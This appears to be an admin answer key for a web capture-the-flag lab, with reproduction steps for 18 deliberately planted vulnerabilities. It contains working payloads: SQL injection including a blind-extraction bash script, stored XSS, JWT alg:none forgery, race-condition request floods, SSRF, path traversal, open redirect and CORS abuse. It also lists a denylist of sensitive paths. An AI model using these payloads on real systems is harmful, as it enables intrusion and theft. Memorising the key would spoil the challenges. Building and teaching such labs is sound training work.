# INSTANT WEB CTF — Player Reproduction Guide

**Admin-only document.** Verified against the current source (`services/instant-web`,
`services/infra-service`) and the live database as of this revision. All 18 challenges are
implemented and enabled. Flag values are never printed below — each section names the flag's
environment variable and the exact condition/location that reveals it in-app.

## Session setup (used by most challenges)

- **Register** (free, self-service): `GET /company/portal/register` for a CSRF token, then
  `POST /company/portal/register` with `name`, `email`, `password` (≥8 chars), `confirm_password`,
  `_csrf`. Sets the `customer_sid` cookie and redirects to the dashboard. New accounts
  automatically get one starter invoice (needed for challenges 06/11).
- **CSRF token:** every state-changing `POST` needs a `_csrf` field matching the session's token,
  rendered as `<input type="hidden" name="_csrf" value="...">` on the page you'd normally submit
  the form from. Grab it from any page load in the same session first.
- Routes below marked **[Auth]** need this session cookie. Routes marked **[No auth]** don't.

---

| # | Challenge | Vulnerability | Difficulty | Points |
|---|---|---|---|---|
| 01 | Information Disclosure | Undocumented debug endpoint | beginner | 50 |
| 02 | SQL Injection | UNION-based, string context | beginner | 50 |
| 03 | Path Traversal | Off-by-one directory containment | beginner | 50 |
| 04 | Authentication Bypass | SQLi comment-bypass login | beginner | 75 |
| 05 | Cross-Site Scripting | Stored, unescaped output | beginner | 75 |
| 06 | IDOR | Missing ownership check | easy | 100 |
| 07 | JWT Authentication Weakness | `alg:none` signature bypass | easy | 100 |
| 08 | Business Logic Flaw | Missing lower-bound check | medium | 125 |
| 09 | CSRF | Unprotected state-changing GET | medium | 125 |
| 10 | Unrestricted File Upload | Declared-type trust | medium | 150 |
| 11 | Local File Inclusion | `path.resolve()` anchor bypass | medium | 175 |
| 12 | Race Condition | Check-then-act, no atomicity | medium | 200 |
| 13 | Advanced SQL Injection | Boolean-blind, numeric context | hard | 250 |
| 14 | SSRF | Path-unrestricted target allowlist | medium | 200 |
| 15 | Open Redirect | Substring-based allowlist bypass | easy | 125 |
| 16 | CORS Misconfiguration | Reflected Origin + credentials | medium | 200 |
| 17 | Remote File Inclusion | Network fetch + unescaped embed | hard | 275 |
| 18 | Chained Web Attack | IDOR + JWT forgery | advanced | 400 |

---

## 01 — Information Disclosure

**Vulnerability:** Undocumented, unauthenticated debug endpoint
**Difficulty:** beginner
**Points:** 50

**Discovery**
1. `GET /company/robots.txt` — lists the exact path.

**Endpoint** `GET /company/debug/deploy-status-8f3a` **[No auth]**

**Exploit**
1. Request the endpoint directly.

**Payload**
```http
GET /company/debug/deploy-status-8f3a HTTP/1.1
Host: <host>
```

**Flag**
Always present in the JSON response's `notes` field ("Tracking ref: ..."). `FLAG_INFO_DISCLOSURE`.

---

## 02 — SQL Injection

**Vulnerability:** UNION-based SQL injection, string context
**Difficulty:** beginner
**Points:** 50

**Discovery**
1. `GET /company/products` — search box posts to `?q=`.
2. `q=abc'` → HTTP 500 (unhandled Postgres error) — the tell.

**Endpoint** `GET /company/products/search?q=` **[No auth]**

**Exploit**
1. Confirm column count: `q=x' ORDER BY 5 -- ` succeeds, `ORDER BY 6 -- ` 500s → 5 columns.
2. UNION-select from the target table (name not shown anywhere — found via
   `information_schema.tables`/guessed as `internal_notes`).

**Payload**
```
GET /company/products/search?q=nonexistentxyz' UNION SELECT title, reference, content, priority, tag FROM internal_notes -- 
```

**Flag**
Renders as a product card; the flag is inside the description text
("Tracking ref: ..."). `FLAG_SQL_INJECTION`.

---

## 03 — Path Traversal

**Vulnerability:** Off-by-one directory containment check
**Difficulty:** beginner
**Points:** 50

**Discovery**
1. `GET /company/robots.txt` — lists `Disallow: /portal/documents/protected/flag.txt` (exact path).
2. Customer Portal → Documents (`/company/portal/documents`) has `?file=` download links.

**Endpoint** `GET /company/portal/documents/download?file=` **[Auth]**

**Exploit**
1. Request the sibling `protected/` directory named in `robots.txt`.

**Payload**
```
GET /company/portal/documents/download?file=../protected/flag.txt HTTP/1.1
Cookie: customer_sid=<session>
```

**Flag**
File contents, always present. `FLAG_PATH_TRAVERSAL`.

---

## 04 — Authentication Bypass

**Vulnerability:** SQL injection comment-bypass on a deprecated login form
**Difficulty:** beginner
**Points:** 75

**Discovery**
1. `GET /company/robots.txt` — `Disallow: /portal/legacy-login` (exact path).
2. `GET /company/blog` → "Customer Spotlight: How Meridian Capital Scaled Their Back Office"
   (`/company/blog/customer-spotlight-meridian-capital`) — names the target account's exact email
   in the post body.

**Endpoint** `POST /company/portal/legacy-login` **[No auth — this creates the session]**

**Exploit**
1. Submit `email` as the victim's address followed by a SQL comment; any `password`.
   (A generic `' OR '1'='1' -- ` does **not** reliably work — it strips the `role='customer'`
   filter too and can land on a non-customer row.)

**Payload**
```http
POST /company/portal/legacy-login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=alexandra.chen%40meridiancapital.example%27+--+&password=anything
```

**Flag**
`GET /company/portal/dashboard` after login shows an "Account Notes" card containing the flag.
`FLAG_AUTH_BYPASS`.

---

## 05 — Cross-Site Scripting (Stored)

**Vulnerability:** Stored XSS — `message` field rendered unescaped (`<%- %>`)
**Difficulty:** beginner
**Points:** 75

**Discovery**
1. Customer Portal → Support (`/company/portal/support`) — ticket form.

**Endpoint** `POST /company/portal/support` **[Auth]**

**Exploit**
1. Submit a ticket with a literal `<script` in `message` (subject/message both need ≥3 chars).

**Payload**
```http
POST /company/portal/support HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: customer_sid=<session>

_csrf=<token>&subject=test&message=<script>alert(document.domain)</script>
```

**Flag**
`GET /company/portal/support` shows the flag beneath the flagged ticket (server detects the
literal `<script` at submission time). `FLAG_XSS`.

---

## 06 — IDOR

**Vulnerability:** Missing ownership check on invoice lookup
**Difficulty:** easy
**Points:** 100

**Discovery**
1. Customer Portal → Invoices (`/company/portal/invoices`) — your own starter invoice links to
   `/company/portal/invoices/<id>` (small sequential integer).

**Endpoint** `GET /company/portal/invoices/:id` **[Auth — any customer, no ownership required]**

**Exploit**
1. Request a different small integer id than your own.

**Payload**
```
GET /company/portal/invoices/4 HTTP/1.1
Cookie: customer_sid=<any authenticated session>
```
(`id=4` is the current seeded "Morgan Reyes" invoice in this deployment — enumerate nearby small
integers if a fresh seed changes it.)

**Flag**
Shown in the "Internal memo" box on the returned invoice (only populated for this target).
`FLAG_IDOR`.

---

## 07 — JWT Authentication Weakness

**Vulnerability:** `alg:"none"` signature-verification bypass
**Difficulty:** easy
**Points:** 100

**Discovery**
1. Customer Portal → API Tokens (`/company/portal/api-tokens`) — generate a token, see example
   `curl` usage against `/company/api/account`.
2. The page's "API reference" table also lists `GET /company/api/internal/diagnostics`
   (`admin:internal` scope).

**Endpoint** `GET /company/api/internal/diagnostics` **[Bearer token, no cookie]**

**Exploit**
1. `POST /company/portal/api-tokens/generate` (`[Auth]`) → get a legit token
   (`{"alg":"HS256",...}.{"sub":<id>,"email":...,"scope":"account:read"}.<sig>`).
2. Re-encode with header `{"alg":"none"}`, payload `scope` changed to `"admin:internal"`, and an
   **empty** third segment.

**Payload (forging the token)**
```bash
b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | b64url)
PAYLOAD=$(printf '{"sub":<your id>,"scope":"admin:internal"}' | b64url)
TOKEN="${HEADER}.${PAYLOAD}."     # note the trailing dot, empty signature
curl -H "Authorization: Bearer $TOKEN" http://<host>/company/api/internal/diagnostics
```

**Flag**
`internal_notice` field of the JSON response, only when `scope === "admin:internal"`.
`FLAG_JWT`.

---

## 08 — Business Logic Flaw

**Vulnerability:** Missing lower-bound validation on a redemption amount
**Difficulty:** medium
**Points:** 125

**Discovery**
1. Customer Portal → Rewards (`/company/portal/rewards`) — redeem form, "Platinum Concierge —
   100,000 pts" tier shown.

**Endpoint** `POST /company/portal/rewards/redeem` **[Auth]**

**Exploit**
1. Submit a large **negative** `points` value (check is only `points > balance`, never
   `points > 0`; subtracting a negative increases the balance).

**Payload**
```http
POST /company/portal/rewards/redeem HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: customer_sid=<session>

_csrf=<token>&points=-200000
```

**Flag**
Shown on `/company/portal/rewards` once balance ≥ 100,000 ("Platinum Concierge unlocked").
`FLAG_BUSINESS_LOGIC`.

---

## 09 — CSRF

**Vulnerability:** State-changing `GET` with no CSRF token
**Difficulty:** medium
**Points:** 125

**Discovery**
1. `GET /company/robots.txt` — `Disallow: /portal/settings/quick-unsubscribe` (exact path).
2. Settings page also prints this same URL directly in its text.

**Endpoint** `GET /company/portal/settings/quick-unsubscribe` **[Auth — no CSRF token needed, that's the bug]**

**Exploit**
1. Simply load the URL while authenticated (a plain link/navigation is enough — no form, no
   token).

**Payload**
```
GET /company/portal/settings/quick-unsubscribe HTTP/1.1
Cookie: customer_sid=<session>
```

**Flag**
`GET /company/portal/settings` afterward shows a "Compliance notice" box (server distinguishes
this path from the CSRF-protected form via a `notification_pref_source` column). `FLAG_CSRF`.

---

## 10 — Unrestricted File Upload

**Vulnerability:** Trusts the multipart part's declared `Content-Type`, never checks actual bytes
**Difficulty:** medium
**Points:** 150

**Discovery**
1. Customer Portal → Profile (`/company/portal/profile`) — avatar upload form.

**Endpoint** `POST /company/portal/profile/avatar` **[Auth, multipart]**

**Exploit**
1. Upload a non-image file while declaring an allowed image `Content-Type` for that part.

**Payload**
```bash
curl -b "customer_sid=<session>" \
     -F "_csrf=<token>" \
     -F "avatar=@payload.txt;type=image/png" \
     http://<host>/company/portal/profile/avatar
```

**Flag**
`GET /company/portal/profile` shows an "Automated content scanner" notice once the saved file's
magic bytes don't match its declared image type. `FLAG_FILE_UPLOAD`.

---

## 11 — Local File Inclusion

**Vulnerability:** `path.resolve()` absolute-path anchor bypass + unblocked `../` traversal
**Difficulty:** medium
**Points:** 175

**Discovery**
1. Any invoice detail page (`/company/portal/invoices/:id` — your own invoice from setup works)
   has three receipt links: `?template=standard|detailed|minimal`.

**Endpoint** `GET /company/portal/invoices/:id/receipt?template=` **[Auth — must own the invoice]**

**Exploit**
1. Relative traversal or absolute path to escape `receipt-templates/` into the sibling
   `internal-billing/` directory. A mandatory `.txt` suffix is auto-appended if missing.

**Payload**
```
GET /company/portal/invoices/<your-invoice-id>/receipt?template=../internal-billing/notes.txt
```
or
```
GET /company/portal/invoices/<your-invoice-id>/receipt?template=/app/challenge-data/internal-billing/notes.txt
```

**Flag**
File contents, always present. `FLAG_LFI`.

---

## 12 — Race Condition

**Vulnerability:** Check-then-act with no transaction/row lock on a one-time claim
**Difficulty:** medium
**Points:** 200

**Discovery**
1. Rewards page → "Welcome Bonus" card: "New accounts can claim a one-time 500 point welcome
   bonus."

**Endpoint** `POST /company/portal/rewards/claim-bonus` **[Auth]**

**Sequential behavior (verify first):** one request → `welcome_bonus_claims = 1`, +500 points, no
flag. A second request afterward is rejected ("You have already claimed your welcome bonus."),
state unchanged.

**Concurrent exploit**
1. Get a session + CSRF token.
2. Fire many requests **simultaneously** (not one-after-another):
```bash
JAR=cookies.txt   # already logged in
CSRF=<token from a page load>
for i in $(seq 1 15); do
  curl -s -b "$JAR" -X POST http://<host>/company/portal/rewards/claim-bonus \
       -d "_csrf=$CSRF" -o "resp_$i.html" &
done
wait
```
A single-server test with 10–15 parallel requests reliably produces `welcome_bonus_claims >= 2`
(observed up to 15/15 landing in one run against this deployment).

**Flag**
Included in the response / on the Rewards page once `welcome_bonus_claims >= 2` — proof of a
genuinely won race; no sequential path can produce it. `FLAG_RACE_CONDITION`.

**Reset**
`POST /company/portal/rewards/reset-bonus` (same auth/CSRF pattern) — not linked in the UI, resets
your own account's `welcome_bonus_claims` to 0 (and reverses the points) so you can retry.

---

## 13 — Advanced SQL Injection

**Vulnerability:** Boolean-based blind SQL injection, numeric (unquoted) context
**Difficulty:** hard
**Points:** 250

**Discovery**
1. Public site nav → "Track Order" (`/company/track-order`). Non-numeric `order_id` is silently
   accepted (no validation error); response only ever says found/not-found, never row data.

**Endpoint** `POST /company/track-order` **[No auth]** — parameter `order_id` (numeric context, no
quotes needed to break out).

**Oracle**
- `order_id=0 OR (1=1) -- ` + any `email` → "We found a matching order."
- `order_id=0 OR (1=2) -- ` + any `email` → "No matching order found..."

**Extraction method** — binary search per character against `support_escalations.escalation_note`
(never read by any legitimate route):
```bash
oracle() {  # returns 0 (true) or 1 (false)
  curl -s -X POST http://<host>/company/track-order \
       --data-urlencode "order_id=0 OR ($1) -- " --data-urlencode "email=x" \
    | grep -q "We found a matching order"
}

# length
lo=0; hi=256
while [ $lo -lt $hi ]; do
  mid=$(((lo+hi)/2))
  if oracle "(SELECT length(escalation_note) FROM support_escalations LIMIT 1) > $mid"; then lo=$((mid+1)); else hi=$mid; fi
done
length=$lo

# each character, binary search over ASCII
result=""
for pos in $(seq 1 $length); do
  clo=32; chi=126
  while [ $clo -lt $chi ]; do
    cmid=$(((clo+chi)/2))
    if oracle "(SELECT ascii(substring(escalation_note,$pos,1)) FROM support_escalations LIMIT 1) > $cmid"; then clo=$((cmid+1)); else chi=$cmid; fi
  done
  result="${result}$(printf \\$(printf '%03o' $clo))"
done
echo "$result"
```
(This exact script was run against the current deployment and correctly reconstructed the full
note text including the flag.)

**Flag**
Embedded in the extracted `escalation_note` text ("Tracking ref: ..."). `FLAG_ADVANCED_SQLI`.

---

## 14 — SSRF

**Vulnerability:** Host/port allowlist is real, but the path on an allowed host is unrestricted
**Difficulty:** medium
**Points:** 200

**Discovery**
1. Customer Portal → Integrations (`/company/portal/integrations`) — view page source: a hidden
   `target` field defaults to `http://template-service:4002/health`.

**Endpoint** `POST /company/portal/integrations/connectivity-test` **[Auth]** — parameter `target`
(must start with `http://internal-api:4001/`, `http://template-service:4002/`, or
`http://infra-service:4003/` — real, unbypassable for host/port).

**Exploit (two hops)**
1. `target=http://infra-service:4003/status` → response includes
   `"diagnostics_endpoint":"/diagnostics/internal-report"`.
2. `target=http://infra-service:4003/diagnostics/internal-report` → flag.

**Payload**
```http
POST /company/portal/integrations/connectivity-test HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: customer_sid=<session>

_csrf=<token>&target=http://infra-service:4003/diagnostics/internal-report
```

**Flag**
`internal_notice` field of the response. `FLAG_SSRF`.

---

## 15 — Open Redirect

**Vulnerability:** Substring check on the whole URL instead of a parsed hostname comparison
**Difficulty:** easy
**Points:** 125

**Discovery**
1. Homepage → "Trusted by our partners" links use `/company/out?url=https://partners.instant.example/...`.

**Endpoint** `GET /company/out?url=` **[No auth]** — allowlist domain: `partners.instant.example`.

**Exploit**
1. Craft a URL that *contains* the allowed domain as a substring but resolves elsewhere.

**Payload**
```
GET /company/out?url=http://attacker.example/?x=partners.instant.example
```
or
```
GET /company/out?url=http://partners.instant.example.attacker.example/
```

**Flag**
Shown on the "You're leaving Instant" interstitial as "Destination verification failed" — only
when the server's real hostname parse disagrees with the substring check (a genuine bypass). A
real partner URL produces no flag. `FLAG_OPEN_REDIRECT`.

---

## 16 — CORS Misconfiguration

**Vulnerability:** Reflected `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true`
**Difficulty:** medium
**Points:** 200

**Discovery**
1. Settings page → "Developer: account widget" documents
   `GET /company/portal/api/widget-summary` (session-cookie authenticated).

**Endpoint** `GET /company/portal/api/widget-summary` **[Auth, cookie]** — vulnerable header:
`Origin` (any value, including `null`, gets reflected).

**Exploit**
1. Send a request with a foreign `Origin` header and the session cookie (in a browser PoC: a
   local `file://` HTML page running `fetch(url, {credentials:'include'})` sends `Origin: null`
   and — because of the reflected header — the browser lets the foreign page read the response).

**Payload**
```bash
curl -b "customer_sid=<session>" -H "Origin: null" \
     http://<host>/company/portal/api/widget-summary
```

**Flag**
`security_notice` field, included only when the request has a valid session **and** an `Origin`
header that doesn't match the app's own origin. Same-origin/direct access shows no flag.
`FLAG_CORS`.

---

## 17 — Remote File Inclusion

**Vulnerability:** Genuine RFI — `instant-web` fetches a named snippet from a separate container
(`infra-service`) over the network and embeds the response **unescaped** into the page. The
vulnerable file resolution (no containment check, `path.resolve()` bug) lives on `infra-service`
itself, in its `GET /assets?name=` route.
**Difficulty:** hard
**Points:** 275

**Discovery**
1. Settings → "preview a snippet" → Signature Preview page
   (`/company/portal/settings/signature-preview`) — its own text explicitly names the sibling
   `internal/` folder on the content host: *"engineering notes moved to `internal/` during a
   cleanup, not linked from here."*

**Endpoint** `GET /company/portal/settings/signature-preview?snippet=` **[Auth]** — proxies to
`infra-service`'s `GET /assets?name=<snippet>` (mandatory `.txt` suffix auto-appended if missing;
denylist blocks `/proc/`, `/etc/shadow`, `.ssh/`, `docker.sock`).

**Exploit**
1. Traverse out of the snippet library into `internal/`.

**Payload**
```
GET /company/portal/settings/signature-preview?snippet=../internal/flag
```

**Flag**
Rendered directly (unescaped) into the "Preview" pane. `FLAG_RFI`.

---

## 18 — Chained Web Attack

**Vulnerability:** Challenge 06's IDOR (discover a service account's numeric id) chained into
Challenge 07's `alg:none` JWT forgery (that id becomes the required `sub` claim) — no new
vulnerability class.
**Difficulty:** advanced
**Points:** 400

**Discovery**
1. API Tokens page → API reference table lists `GET /company/api/internal/ops-console`, noted as
   requiring "an authorized ops-integration service account" — `admin:internal` scope alone
   (sufficient for challenge 07) is not enough here.

**Step 1 — IDOR (reuse challenge 06's technique)**
Enumerate small invoice ids via `GET /company/portal/invoices/:id` **[Auth]** until one's memo
reads "Ops integration account - service ID `<N>` - reserved for automated admin:internal
diagnostics only." (`id=7` in this deployment's current seed data; the account's own numeric id,
`<N>`, is what you need next — currently `31`. Both will differ on a freshly reset deployment —
enumerate to find them.)

**Step 2 — JWT forgery (reuse challenge 07's technique), with the discovered id as `sub`**
```bash
b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | b64url)
PAYLOAD=$(printf '{"sub":<N from step 1>,"scope":"admin:internal"}' | b64url)
TOKEN="${HEADER}.${PAYLOAD}."
curl -H "Authorization: Bearer $TOKEN" http://<host>/company/api/internal/ops-console
```

**Final endpoint** `GET /company/api/internal/ops-console` **[Bearer token]** — checks
`scope === "admin:internal"` **and** `sub === <ops-integration account's id>`. A forged token
with the right scope but the player's own `sub` is rejected.

**Flag**
`internal_notice` field, only when both conditions hold simultaneously. `FLAG_CHAINED_ATTACK`.

---

## Quick Reproduction Index

| # | Primary Technique | Endpoint |
|---|---|---|
| 01 | Direct request to undocumented endpoint | `GET /company/debug/deploy-status-8f3a` |
| 02 | UNION-based SQLi | `GET /company/products/search?q=` |
| 03 | Path traversal (`../`) | `GET /company/portal/documents/download?file=` |
| 04 | SQLi comment-bypass login | `POST /company/portal/legacy-login` |
| 05 | Stored XSS payload | `POST /company/portal/support` |
| 06 | IDOR — increment `:id` | `GET /company/portal/invoices/:id` |
| 07 | JWT `alg:none` forgery | `GET /company/api/internal/diagnostics` |
| 08 | Negative-value redemption | `POST /company/portal/rewards/redeem` |
| 09 | State-changing GET, no CSRF token | `GET /company/portal/settings/quick-unsubscribe` |
| 10 | Spoofed multipart `Content-Type` | `POST /company/portal/profile/avatar` |
| 11 | `path.resolve()` traversal (local) | `GET /company/portal/invoices/:id/receipt?template=` |
| 12 | Concurrent requests, check-then-act | `POST /company/portal/rewards/claim-bonus` |
| 13 | Boolean-blind SQLi + extraction script | `POST /company/track-order` |
| 14 | SSRF, path-unrestricted allowlist | `POST /company/portal/integrations/connectivity-test` |
| 15 | Substring allowlist bypass | `GET /company/out?url=` |
| 16 | Reflected `Origin` + credentials | `GET /company/portal/api/widget-summary` |
| 17 | `path.resolve()` traversal (remote fetch + embed) | `GET /company/portal/settings/signature-preview?snippet=` |
| 18 | IDOR → JWT forgery chain | `GET /company/portal/invoices/:id` → `GET /company/api/internal/ops-console` |
